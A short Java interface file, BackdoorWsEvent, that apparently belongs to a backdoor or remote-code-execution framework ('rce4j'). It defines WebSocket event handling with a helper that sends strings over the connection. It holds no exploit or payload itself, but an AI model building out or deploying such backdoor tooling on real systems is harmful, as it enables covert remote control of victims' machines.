package org.rce4j.module.event;

import org.rce4j.net.WsConnection;

public non-sealed interface BackdoorWsEvent extends BackdoorEvent {
    WsEventType getType();
    
    WsConnection getConnection();
    
    default void send(String s) {
        getConnection().send(s);
    }
}
